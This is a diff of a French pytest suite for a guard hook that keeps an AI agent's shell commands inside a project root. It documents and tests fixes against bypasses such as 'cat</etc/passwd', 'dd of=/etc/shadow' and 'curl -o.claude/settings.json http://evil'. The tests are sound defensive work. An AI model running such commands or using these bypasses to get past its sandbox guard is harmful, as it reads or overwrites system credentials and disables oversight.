@@ -456,14 +456,19 @@ def test_double_compile_source_et_fichier_installe(racine):
 
 
 class TestOperateursColles:
-    """B-24d — ferme le contournement par opérateurs shell collés au chemin.
+    r"""B-24d — ferme le contournement par opérateurs shell collés au chemin.
 
-    Mesure : ``shlex.split(commande, posix=True)`` ne sépare pas
-    ``<``, ``>``, ``;``, ``|``, ``&`` lorsqu'ils sont collés au token
-    voisin (``cat</etc/passwd`` reste un seul token). Le correctif
-    remplace le tokenizer par ``shlex.shlex(..., punctuation_chars=True,
-    whitespace_split=True)`` qui, lui, les isole. Ces tests exécutent
-    RÉELLEMENT la garde générée via subprocess et asserent l'exit code.
+    Mécanisme RÉEL : UN SEUL découpage de la commande brute sur la
+    classe des délimiteurs shell (``\s<>;|&()"'`$``), sans tokeniseur
+    dédié (shlex et son repli re.split ont été retirés). Les opérateurs
+    shell (``<``, ``>``, ``;``, ``|``, ``&``, ``(``, ``)``) sont DANS
+    la classe de découpage — donc un fragment collé ``cat</etc/passwd``
+    est correctement séparé en ``cat`` et ``/etc/passwd``. Le découpage
+    ne lève jamais d'exception (re.split ne lève pas sur des guillemets
+    déséquilibrés), donc aucun repli n'est possible. Périmètre inchangé
+    : extraction de fragments LITTÉRAUX uniquement, aucune interprétation
+    du shell. Ces tests exécutent RÉELLEMENT la garde générée via
+    subprocess et asserent l'exit code.
     """
 
     def test_cat_redirection_entree_collee_refuse(self, tmp_path, racine, env_tmpdir):
@@ -680,10 +685,13 @@ def test_refus_cwd_journalise_et_chaine_verifiee(tmp_path, racine, env_tmpdir):
 def test_repli_heredoc_guillemet_orphelin_cible_hors_racine_refuse(
     tmp_path, racine, env_tmpdir
 ):
-    """Repli forcé par here-doc à guillemet orphelin, cible hors racine -> exit 2.
+    """Here-doc à guillemet orphelin, cible hors racine -> exit 2.
 
-    La commande contient un here-doc avec un guillemet orphelin qui force
-    shlex à lever ValueError ; le repli doit malgré tout reconnaître
+    La commande contient un here-doc avec un guillemet orphelin. Le
+    mécanisme RÉEL de la garde (un seul découpage de la commande brute
+    sur la classe des délimiteurs shell, sans tokeniseur ni repli) ne
+    lève jamais d'exception : la cible littérale ``/etc/passwd`` est
+    extraite directement du flux de fragments et la garde la refuse.
     `/etc/passwd` comme chemin hors racine et REFUSER.
     """
     script = ecrire_garde(tmp_path, racine)
@@ -984,3 +992,126 @@ def test_continuation_ligne_non_regression(racine, env_tmpdir, tmp_path):
     assert code == 0
     code, _ = run(script, charge("Bash", {"command": "cat /etc/passwd"}, cwd=racine), env=env_tmpdir)
     assert code == 2
+
+
+class TestOptionsColleesChemin:
+    """B-24d tour 8 — ferme le contournement par chemin collé à un préfixe d'option.
+
+    Mesure : un chemin absolu collé à un préfixe d'option (``dd if=/etc/passwd``,
+    ``awk --file=/etc/passwd``, ``tar -f/etc/passwd``, ``curl -o.claude/...``,
+    etc.) n'était pas reconnu comme absolu : le fragment entier n'est pas
+    absolu, il est donc résolu contre le cwd et tombe SOUS la racine ->
+    autorisé, alors que l'outil invoque bien une lecture ou une écriture
+    hors racine. Cas ``-o.claude/settings.json`` : l'auto-protection de la
+    cible cachée est contournée si le fragment n'est pas extrait.
+
+    Correctif : deux règles, bornées par les conventions d'options
+    POSIX/GNU.
+      R1. Le signe ``=`` est ajouté à la classe des délimiteurs : il
+          isole le préfixe d'option longue (``--file=...``,
+          ``--target-directory=...``) et couvre aussi les affectations
+          de variables d'environnement en préfixe de commande
+          (``VAR=/chemin cmd``).
+      R2. Un fragment qui COMMENCE par ``-`` est une option (convention
+          universelle). On en extrait AUSSI le suffixe à partir du
+          premier caractère ouvrant un chemin (``/``, ``~``, ``.``).
+          Le fragment entier reste également candidat (les deux sont
+          contrôlés).
+
+    Périmètre inchangé : extraction de fragments LITTÉRAUX, aucune
+    interprétation du shell. Ces tests exécutent RÉELLEMENT la garde
+    générée via subprocess et asserent l'exit code.
+    """
+
+    # --- REFUS attendus (exit 2) ---
+
+    def test_dd_if_etc_passwd_refuse(self, tmp_path, racine, env_tmpdir):
+        """``dd if=/etc/passwd`` : ``=`` isole le préfixe d'option du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "dd if=/etc/passwd"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_dd_of_etc_shadow_refuse(self, tmp_path, racine, env_tmpdir):
+        """``dd of=/etc/shadow`` : ``=`` isole le préfixe d'option du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "dd of=/etc/shadow"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_awk_file_etc_passwd_refuse(self, tmp_path, racine, env_tmpdir):
+        """``awk --file=/etc/passwd`` : ``=`` isole le préfixe d'option longue du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "awk --file=/etc/passwd"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_cp_target_directory_etc_refuse(self, tmp_path, racine, env_tmpdir):
+        """``cp --target-directory=/etc x`` : ``=`` isole le préfixe long du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "cp --target-directory=/etc x"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_tar_f_etc_passwd_refuse(self, tmp_path, racine, env_tmpdir):
+        """``tar -f/etc/passwd`` : ``-f`` agglutiné au chemin, suffixe extrait -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "tar -f/etc/passwd"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_curl_o_claude_settings_auto_protection_refuse(self, tmp_path, racine, env_tmpdir):
+        """``curl -o.claude/settings.json http://evil`` : suffixe ``.claude/settings.json`` extrait,
+        auto-protection de la cible cachée déclenchée -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge(
+            "Bash", {"command": "curl -o.claude/settings.json http://evil"}, cwd=racine
+        )
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_gcc_I_usr_include_refuse(self, tmp_path, racine, env_tmpdir):
+        """``gcc -I/usr/include x.c`` : ``-I`` agglutiné au chemin, suffixe extrait -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "gcc -I/usr/include x.c"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    # --- AUTORISATIONS attendues (exit 0), non-régression stricte ---
+
+    def test_ls_la_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``ls -la`` : aucune chemin littéral, pas de faux positif -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "ls -la"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_tar_xzf_archive_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``tar -xzf archive.tar.gz`` : option agglutinée SANS chemin après -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "tar -xzf archive.tar.gz"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_gcc_I_point_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``gcc -I. x.c`` : suffixe ``.`` (= cwd) autorisé -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "gcc -I. x.c"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_cat_sous_f_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``cat sous/f.txt`` (cwd=racine) : chemin relatif sous la racine -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        (racine / "sous").mkdir()
+        (racine / "sous" / "f.txt").write_text("ok", encoding="utf-8")
+        c = charge("Bash", {"command": "cat sous/f.txt"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_echo_bonjour_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``echo bonjour`` : aucune chemin littéral -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "echo bonjour"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
